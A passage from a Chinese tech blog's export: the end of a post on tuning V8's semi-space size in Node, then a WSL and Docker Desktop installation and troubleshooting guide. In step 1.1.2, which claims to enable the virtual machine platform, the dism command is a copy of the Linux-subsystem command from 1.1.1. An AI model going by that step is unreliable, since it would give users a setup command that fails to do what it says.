<p>虽然 V8 内部使用了线程池来并行做 GC，但是只要有 GC 在工作，主线程就必须 Stop the world，所以说 GC 的时间越长，给我们应用程序带来的延迟时间就越长。刚才上面分析过，新生代分为 <code>Used</code> 和 <code>Inactive</code> 两部分，<code>Used</code> 用满后就触发 GC。但是一个悲观的事实是 Node 中这两个区块的初始值比较小，只有 16MB（两个区块的大小是相同的），如果你的代码逻辑中处理的数据量比较多，可能很快会塞满 <code>Used</code> 区域，导致 GC 频繁发生。</p>
<p>下面我们使用一段代码来模拟一下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> process <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">MyObject</span> <span class="token punctuation">&#123;</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>index <span class="token operator">=</span> i<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">const</span> <span class="token constant">ARRAY_LEN</span> <span class="token operator">=</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token function-variable function">_bigArrayTemp</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token function">__bigArrayTemp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token constant">ARRAY_LEN</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token constant">ARRAY_LEN</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyObject</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">const</span> <span class="token constant">TIMEOUT_SERVER</span> <span class="token operator">=</span> <span class="token number">1000</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> server <span class="token operator">=</span> http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token function">_bigArrayTemp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    res<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'hello world\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
server<span class="token punctuation">.</span>timeout <span class="token operator">=</span> <span class="token constant">TIMEOUT_SERVER</span><span class="token punctuation">;</span>
server<span class="token punctuation">.</span>keepAliveTimeout <span class="token operator">=</span> <span class="token constant">TIMEOUT_SERVER</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>process<span class="token punctuation">.</span>pid<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> started</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.3.1 slow.js</strong></p>
<p>运行 <strong>代码 1.3.1</strong> <code>node slow.js</code>， 使用 JMeter 对其打压，稳定后可以看到 GC 的占比在 6% 左右。</p>
<p><img src="/images/image-20211201173108835.png" alt="image-20211201173108835"></p>
<p><strong>图 1.3.2</strong></p>
<p>在运行 node 的时候，添加参数 <code>--max_semi_space_size=x</code> 可以手动修改 <code>Used</code> 和 <code>Inactive</code> 区块的大小，这里的 <code>x</code> 值只能是 2 的指数值。</p>
<p>使用命令 <code>node --max_semi_space_size=32 slow.js</code> 运行后，重新做压测，观测到差别不大</p>
<p><img src="/images/image-20211201174510296.png" alt="image-20211201174510296"></p>
<p><strong>图 1.3.3</strong></p>
<p>改成 64 MB，再观测</p>
<p><img src="/images/image-20211201175519574.png" alt="image-20211201175519574"></p>
<p><strong>图 1.3.4</strong></p>
<p>可以看到 GC 时间降到 4% 以下。</p>
<p>将其再次扩大到 128 MB</p>
<p><img src="/images/image-20211201182645717.png" alt="image-20211201182645717"></p>
<p><strong>图 1.3.5</strong></p>
<p>GC 时间占比没有发生明显变化，且比 64MB 的 GC 占时还要稍高。</p>
<p>所以综上来看 Node 的 <code>max_semi_space_size</code> 参数设置为 64 才更合理些，但是 Node 官方仅仅是把 V8 拿来使用了，并没有对其做修改以适应服务器端环境。设置为 16 MB，在浏览器端是问题不大的，但是服务器端经常要操作大量数据内容，16 MB 就显得捉襟见肘了。</p>
<p>同时要注意的是，也不要一次性操作太多的内存，比如说将 <strong>代码 1.3.1</strong> 中的 <code>ARRAY_LEN</code> 常量设置为 <code>10</code> 万的时候，即使在怎么设置 <code>max_semi_space_size</code> 的值都用处不大，GC 的时间占比都会特别大。所以说不要在 Node 中一次性操作特别多的对象数据，否则 GC 的延迟时间有多大，对于主线程的损害就有多大。</p>
<h2 id="2-参考资料"><a href="#2-参考资料" class="headerlink" title="2. 参考资料"></a>2. 参考资料</h2><p>Trash talk: the Orinoco garbage collector <a href="https://v8.dev/blog/trash-talk">https://v8.dev/blog/trash-talk</a></p>
<p>How is data stored in V8 JS engine memory? <a href="https://blog.dashlane.com/how-is-data-stored-in-v8-js-engine-memory/">https://blog.dashlane.com/how-is-data-stored-in-v8-js-engine-memory/</a></p>
<p>🚀 Visualizing memory management in V8 Engine (JavaScript, NodeJS, Deno, WebAssembly) <a href="https://deepu.tech/memory-management-in-v8/">https://deepu.tech/memory-management-in-v8/</a></p>
<p>Primitive and Reference value in JavaScript <a href="https://www.geeksforgeeks.org/primitive-and-reference-value-in-javascript/">https://www.geeksforgeeks.org/primitive-and-reference-value-in-javascript/</a></p>
]]></content>
      <categories>
        <category>Node</category>
      </categories>
  </entry>
  <entry>
    <title>wsl 和 docker desktop 的安装教程</title>
    <url>/posts/wsl-and-docker-desktop-install/</url>
    <content><![CDATA[<p>win10 中提供了 wsl 的解决方案，可以在 Windows 中直接开启 linux 子系统，十分方便开发者使用。同时一些重要的功能也要依赖于 wsl 才能启动，比如说 docker desktop。本教程就是演示一下如何在 win10 中配置 wsl ，并且如何正常使用 docker desktop。</p>
<h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h2><h3 id="1-1-安装-wsl"><a href="#1-1-安装-wsl" class="headerlink" title="1.1 安装 wsl"></a>1.1 安装 wsl</h3><p>如果是 Windows 10 2004 版本及以上，通过超级管理员使用命令 <code>wsl --install</code> 即可安装，否则则需要使用如下流程进行手动安装。</p>
<h4 id="1-1-1-启用-linux-子系统"><a href="#1-1-1-启用-linux-子系统" class="headerlink" title="1.1.1 启用 linux 子系统"></a>1.1.1 启用 linux 子系统</h4><p>用管理员身份打开 powershell ，然后输入如下命令回车：</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">dism<span class="token punctuation">.</span>exe <span class="token operator">/</span>online <span class="token operator">/</span><span class="token function">enable-feature</span> <span class="token operator">/</span>featurename:Microsoft<span class="token operator">-</span>Windows<span class="token operator">-</span>Subsystem<span class="token operator">-</span>Linux <span class="token operator">/</span>all <span class="token operator">/</span>norestart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="1-1-2-启动虚拟机功能"><a href="#1-1-2-启动虚拟机功能" class="headerlink" title="1.1.2 启动虚拟机功能"></a>1.1.2 启动虚拟机功能</h4><p>由于我们后续要安装 docker desktop，需要依赖于 wsl 2，所以需要启动 Windows 自带的虚拟机平台功能，同样是管理员身份打开 powershell，然后输入如下命令：</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">dism<span class="token punctuation">.</span>exe <span class="token operator">/</span>online <span class="token operator">/</span><span class="token function">enable-feature</span> <span class="token operator">/</span>featurename:Microsoft<span class="token operator">-</span>Windows<span class="token operator">-</span>Subsystem<span class="token operator">-</span>Linux <span class="token operator">/</span>all <span class="token operator">/</span>norestart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="1-1-3-安装-Linux-内核更新包"><a href="#1-1-3-安装-Linux-内核更新包" class="headerlink" title="1.1.3 安装 Linux 内核更新包"></a>1.1.3 安装 Linux 内核更新包</h4><p>下载 <a href="https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi">适用于 x64 计算机的 WSL2 Linux 内核更新包</a> ，然后安装。</p>
<h4 id="1-1-4-设置-wsl-版本为-wsl-2"><a href="#1-1-4-设置-wsl-版本为-wsl-2" class="headerlink" title="1.1.4 设置 wsl 版本为 wsl 2"></a>1.1.4 设置 wsl 版本为 wsl 2</h4><p>打开 powershell ，然后运行如下命令，即可将默认 wsl 版本切换为 wsl 2，默认为 wsl 1</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">wsl <span class="token operator">--</span><span class="token function">set-default</span><span class="token operator">-</span>version 2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>至此 wsl 的安装就完成了，下面就是选择一个 Linux 子系统进行安装。</p>
<h3 id="1-2-安装-Linux-子系统"><a href="#1-2-安装-Linux-子系统" class="headerlink" title="1.2 安装 Linux 子系统"></a>1.2 安装 Linux 子系统</h3><p>wsl 支持很多 Linux 发行版系统，比如说 <a href="https://www.microsoft.com/store/apps/9n6svws3rx71">Ubuntu</a> <a href="https://www.microsoft.com/store/apps/9NJFZK00FGKV">openSUSE</a> <a href="https://www.microsoft.com/store/apps/9MSVKQC78PK6">Debian</a> <a href="https://www.microsoft.com/store/apps/9n6gdm4k2hnc">Fedora</a> <a href="https://www.microsoft.com/store/apps/9p804crf0395">Alpine</a> 等。鉴于大家使用最多的就是 Ubuntu，下面就显示如何安装 Ubuntu，根据上面的链接，打开 Microsoft Store，然后选择 <strong>获取</strong> 按钮。</p>
<p><img src="/images/install_wsl_ubuntu.png"></p>
<p><strong>图 1.2.1</strong></p>
<blockquote>
<p>由于我已经安装了 Ubuntu 20.04，所以这里使用的 Ubuntu 18.04 的展示界面截的图。</p>
</blockquote>
<p>安装完成后，可以从开始菜单中找到 Ubuntu 的快捷方式，点击打开后第一次运行，会要求输入用户名、密码，等待几分钟后初始化完成，以后就可以直接点击快捷方式进入 Ubuntu 系统了。</p>
<h3 id="1-3-安装-docker-desktop"><a href="#1-3-安装-docker-desktop" class="headerlink" title="1.3 安装 docker desktop"></a>1.3 安装 docker desktop</h3><p>docker desktop 基于 WSL2，所以要完成 1.1 小节所有的安装步骤，否则安装完成后无法启动。docker desktop 的安装包可以从官网下载 <a href="https://www.docker.com/products/docker-desktop">https://www.docker.com/products/docker-desktop</a> 。</p>
<h3 id="1-4-docker-desktop-下配置-kubernetes"><a href="#1-4-docker-desktop-下配置-kubernetes" class="headerlink" title="1.4 docker desktop 下配置 kubernetes"></a>1.4 docker desktop 下配置 kubernetes</h3><p>Windows 下可以从 Docker Desktop 中直接开启 kubernetes 功能，它会通过创建 docker 容器的模式来提供 kubernetes 服务，不过由于众所周知的原因，其容器用到的镜像在国内无法下载，你需要使用这个 <a href="https://github.com/AliyunContainerService/k8s-for-docker-desktop">k8s-for-docker-desktop</a> 项目提供的解决方案。</p>
<p>我们在设置里找到当前 docker-desktop 的版本</p>
<p><img src="/images/docker_desktop_k8s.png"></p>
<p><strong>图 1.4.1</strong></p>
<p>笔者安装的是 1.21.5 版本，clone 一下 k8s-for-docker-desktop 项目，切换到 v1.21.5 分支</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">git</span> clone https://github.com/AliyunContainerService/k8s-for-docker-desktop.git
<span class="token function">git</span> checkout v1.21.5
.<span class="token punctuation">\</span>load_images.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.4.1</strong></p>
<p>接着还是在项目 k8s-for-docker-desktop 目录中，执行下述命令来配置 kubernetes 控制台：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">kubectl create -f kubernetes-dashboard.yaml
kubectl proxy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>代码 1.4.2</strong></p>
<p><code>kubectl proxy</code> 命令，会输出如下提示 <code>Starting to serve on 127.0.0.1:8001</code>，说明启动控制台成功，然后你需要在浏览器中访问下面地址</p>
<p><a href="http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/">http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/</a></p>
<p>这个地址会提示输入 token，在 Windows 中 token 可以通过在 powsershell 中执行如下命令获得：</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token variable">$TOKEN</span>=<span class="token punctuation">(</span><span class="token punctuation">(</span>kubectl <span class="token operator">-</span>n kube<span class="token operator">-</span>system describe secret default <span class="token punctuation">|</span> <span class="token function">Select-String</span> <span class="token string">"token:"</span><span class="token punctuation">)</span> <span class="token operator">-</span>split <span class="token string">" +"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>1<span class="token punctuation">]</span>
kubectl config <span class="token function">set-credentials</span> docker<span class="token operator">-</span><span class="token keyword">for</span><span class="token operator">-</span>desktop <span class="token operator">--</span>token=<span class="token string">"$&#123;TOKEN&#125;"</span>
<span class="token function">echo</span> <span class="token variable">$TOKEN</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h2 id="2-问题总结"><a href="#2-问题总结" class="headerlink" title="2 问题总结"></a>2 问题总结</h2><h3 id="2-1-Win10-下-WSL2-预留端口"><a href="#2-1-Win10-下-WSL2-预留端口" class="headerlink" title="2.1 Win10 下 WSL2 预留端口"></a>2.1 Win10 下 WSL2 预留端口</h3><p>win10 下的 wsl2 默认会预留若干端口，导致我们程序中无法再使用这些端口做监听，在启动时程序会报错误 <code>listen EACCES: permission denied</code>，通过命令 <code>netsh interface ipv4 show excludedportrange protocol=tcp</code> 可以查看哪些端口被占用了。</p>
<h3 id="2-2-WSL2-下运行-docker-命令提示无权限"><a href="#2-2-WSL2-下运行-docker-命令提示无权限" class="headerlink" title="2.2 WSL2 下运行 docker 命令提示无权限"></a>2.2 WSL2 下运行 docker 命令提示无权限</h3><p>运行 docker 命令后提示 <code>Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock</code>，则证明当前运行 docker 命令的用户不是 root 用户，需要加 sudo 来运行。</p>
<h3 id="2-3-docker-命令在-WSL2-中找不到"><a href="#2-3-docker-命令在-WSL2-中找不到" class="headerlink" title="2.3 docker 命令在 WSL2 中找不到"></a>2.3 docker 命令在 WSL2 中找不到</h3><p>在 WSL 命令行中执行 docker 命令，如果有如下输出，则证明 docker desktop 中没有开启对于当前 WSL 系统的支持。</p>
<pre class="line-numbers language-none"><code class="language-none">The command &#39;docker&#39; could not be found in this WSL 2 distro.
We recommend to activate the WSL integration in Docker Desktop settings.

See https:&#x2F;&#x2F;docs.docker.com&#x2F;docker-for-windows&#x2F;wsl&#x2F; for details.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>需要手动开启一下，找到  <strong>Resources</strong> &gt;  <strong>WSL Integration</strong>，选中 <strong>Enableinteration with my default WSL distro</strong>， 如果这个复选框已经处于选中状态，说明当前你用的 WSL 系统不是默认的 WSL 系统，可以通过 <code>wsl --set-default &lt;distro name&gt;</code>，或者在下面的 <strong>Enable integration with additional distros</strong> 中选中你使用的系统。最后选择 <strong>Apply &amp; Restart</strong> 按钮即可，更加详细的说明参见<a href="https://docs.docker.com/desktop/windows/wsl/#install">官方文档</a>。</p>
<p><img src="/images/enable_docker_for_wsl.png"></p>
<p><strong>图 2.3.1</strong></p>
<h3 id="2-4-无法从私有镜像仓库拉取镜像"><a href="#2-4-无法从私有镜像仓库拉取镜像" class="headerlink" title="2.4 无法从私有镜像仓库拉取镜像"></a>2.4 无法从私有镜像仓库拉取镜像</h3><p>拉取私有镜像仓库时提示如下错误：</p>
<pre class="line-numbers language-none"><code class="language-none"> &#x3D;&gt; ERROR [internal] load metadata for private-registry-domian:port&#x2F;image-name:latest                                            0.0s
------
 &gt; [internal] load metadata for private-registry-domian:port&#x2F;image-name:latest:
------
failed to solve with frontend dockerfile.v0: failed to create LLB definition: failed to do request: Head https:&#x2F;&#x2F;private-registry-domian:port&#x2F;image-name&#x2F;manifests&#x2F;latest: http: server gave HTTP response to HTTPS client<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>究其原因是由于私有镜像仓库没有启用 https 文件，需要更改 docker 的配置文件，让其信任私有的镜像仓库。在 在 Docker Desktop 中，需要在设置界面中进行修改</p>
<p><img src="/images/insecure_registries.png"></p>
<p>在 <code>insecure-registries</code> 数组中添加公司的镜像仓库根地址。</p>
<h3 id="2-5-WSL2-无法启动"><a href="#2-5-WSL2-无法启动" class="headerlink" title="2.5 WSL2 无法启动"></a>2.5 WSL2 无法启动</h3><p>启动时显示错误 <strong>0x80070003</strong> 或错误 <strong>0x80370102</strong>，这种情况一般出现在新出厂的电脑上，或者 BIOS 升级后的电脑上，很多品牌电脑的 BIOS 默认关闭了 CPU 的虚拟化功能，需要进入 BIOS 自己手动开启，然后才能启动 WSL2。</p>
<h3 id="2-6-WSL2-内的-DNS-不稳定"><a href="#2-6-WSL2-内的-DNS-不稳定" class="headerlink" title="2.6 WSL2 内的 DNS 不稳定"></a>2.6 WSL2 内的 DNS 不稳定</h3><p>wsl2 算是新出的技术，很多方面并不稳定，DNS 解析也隔三岔五会出现问题。通过查看 &#x2F;etc&#x2F;resolv.conf 发现里面配置的是一个内网 DNS 服务地址</p>
<pre class="line-numbers language-none"><code class="language-none"># This file was automatically generated by WSL. To stop automatic generation of this file, add the following entry to &#x2F;etc&#x2F;wsl.conf:
# [network]
# generateResolvConf &#x3D; false
nameserver 172.29.48.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果你使用 WSL 的时候，只解析公网域名的话，比较简单，直接改成公网的域名服务地址即可，比如说 114.114.114.114 ；不过如果你有解析内网域名的需求话，也可以将其改成你的内网 DNS 的服务地址。但是如果你的电脑是移动电脑，同时会在内网环境下和外网环境下都使用，那么配置成内网 DNS 的话，出了内网就没法解析域名了(当然你可以通过播 VPN 来解决，不过那样会比较麻烦)。这个时候就需要派上我们的 Dnsmasq 这个工具了，它是一个 DNS 分流工具，可以根据不同域名后缀来使用不同 DNS server 进行解析。以下的教程同样以 Ubuntu 为例进行讲解。</p>
<blockquote>
<p>类似的工具还有好多，比如 <a href="https://coredns.io/">CoreDns</a> 这个工具也能实现 DNS 分流的工作。</p>
</blockquote>
<p>首先我们需要卸载 systemd-resolved，这个程序默认会占用 53 端口，跟我们的 Dnsmasq 是冲突的。</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> systemctl disable systemd-resolved 
<span class="token function">sudo</span> systemctl stop systemd-resolved<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>按理来说，我们需要修改 &#x2F;etc&#x2F;resolv.conf 文件，不过在 wsl 中 &#x2F;etc&#x2F;resolv.conf 默认会在 WSL 启动的时候被重写，所以需要先修改 &#x2F;etc&#x2F;wsl.conf 文件。这个文件默认不存在，所以不存在的时候，可以创建一个：</p>
<pre class="line-numbers language-none"><code class="language-none">[network]
generateResolvConf &#x3D; false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<blockquote>
<p>修改完配置后，还需要在 Windows 命令中执行 <code>wsl.exe --shutdown</code>，然后重新打开 wsl 命令行才能生效。</p>
</blockquote>
<p>接下来运行 <code>sudo apt-get install dnsmasq</code> 来安装 Dnsmasq ，安装完之后，会生成一个 &#x2F;etc&#x2F;dnsmasq.conf  文件。我们可以在其最后追加一行配置</p>
<pre class="line-numbers language-none"><code class="language-none">conf-dir&#x3D;&#x2F;etc&#x2F;dnsmasq.d&#x2F;,*.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p> 这样我们自定义的域名配置，就可以都放在 &#x2F;etc&#x2F;dnsmasq.d 目录下，在这个目录下创建一个文件 mydns.conf ，然后写入如下配置</p>
<pre class="line-numbers language-none"><code class="language-none">server&#x3D;&#x2F;your_inner_domian&#x2F;your_inner_dns_server
server&#x3D;&#x2F;your_inner_domian&#x2F;::
server&#x3D;119.29.29.29
server&#x3D;223.5.5.5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面配置文件的第一行代表如果要解析的域名中包含 your_inner_domian 字符，则使用 dns 服务器 your_inner_dns_server 进行解析。这是一个子字符串匹配，不论你的域名为 <code>your_inner_domian.com</code> 或者 <code>your_inner_domain.net</code>，使用 your_inner_domian 都可匹配成功。 如果你的 your_inner_dns_server 不支持 ipv6，记得要加入第二行配置，它是用来禁用 ipv6 dns 解析用的（如果你的内网 DNS 服务器不支持 ipv6 协议的话，这个配置特别有用），不过这个功能仅支持 dnsmasq 2.80 及以上版本（使用 Ubuntu 20.02 安装的 Dnsmasq 是 2.80 版本，可以放心使用）。最后一行是留一个默认的 DNS 服务器（<code>119.29.29.29</code> 是腾讯的公共 DNS，<code>223.5.5.5</code> 是阿里的公共 DNS，这里之所有没有使用常用的 114 DNS，是由于它解析国外域名的时候，经常会失败），用来解析公网域名。</p>
<p>配置完成后，修改 &#x2F;etc&#x2F;resolv.conf，将里面的 <code>nameserver</code> 修改为 <code>127.0.0.1</code>。最后执行  <code>service dnsmasq start</code> 来启动 dnsmasq，就可以测试我们的配置了。执行 <code>dig baidu.com</code>，正常情况下会有如下输出：</p>
<pre class="line-numbers language-none"><code class="language-none">; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; baidu.com
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 56800
;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;baidu.com.                     IN      A

;; ANSWER SECTION:
baidu.com.              200     IN      A       220.181.38.148
baidu.com.              200     IN      A       220.181.38.251

;; Query time: 0 msec
;; SERVER: 127.0.0.1#53(127.0.0.1)
;; WHEN: Mon Sep 13 14:52:44 CST 2021
;; MSG SIZE  rcvd: 70<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面输出中 <code>ANSWER SECTION</code> 中列出来了解析出来的 IP，代表解析成功。同样执行 dig 内网域名，也能被正常解析则证明配置正确。</p>
<p>最后需要说明的是 wsl 不好做 service 的开机自启动，下次启动后需要手动执行 <code>sudo service dnsmasq start</code> 才能启动 dnsmasq 。这样就显得不是很友好，可以修改 &#x2F;etc&#x2F;resolv.conf，在 <code>nameserver 127.0.0.1</code> 的后面再追加一行 <code>nameserver 119.29.29.29</code> 这样 dnsmasq 没有启动时，可以保证公网域名能解析。</p>
]]></content>
      <categories>
        <category>Cloud Native</category>
        <category>Docker</category>
      </categories>
  </entry>
</search>
